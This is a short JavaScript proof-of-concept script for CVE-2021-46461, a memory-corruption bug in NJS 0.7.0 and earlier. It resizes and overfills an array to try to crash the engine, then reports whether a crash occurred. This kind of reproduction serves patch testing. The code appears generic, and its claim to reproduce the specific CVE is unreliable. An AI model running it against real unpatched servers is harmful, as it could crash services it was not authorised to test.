// CVE-2021-46461 Proof of Concept
// Target: NJS version 0.7.0 and earlier
// Type: Memory corruption in array handling

function main() {
    console.log("Starting CVE-2021-46461 reproduction...");
    
    try {
        // Create array with specific pattern
        const arr = new Array(0x1000);
        
        // Fill with specific values that trigger the vulnerability
        for (let i = 0; i < arr.length; i++) {
            arr[i] = 0x41414141;
        }
        
        // Modify array length to trigger memory corruption
        arr.length = 0x7FFFFFFF;
        
        // Access elements beyond original bounds
        for (let i = 0x1000; i < 0x1010; i++) {
            arr[i] = 0x42424242;
        }
        
        // Trigger the vulnerability through array operations
        const result = arr.slice(0x1000, 0x1010);
        console.log("Array slice result:", result.length);
        
        // Force garbage collection if available
        if (typeof gc === 'function') {
            gc();
        }
        
        console.log("CVE-2021-46461: No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();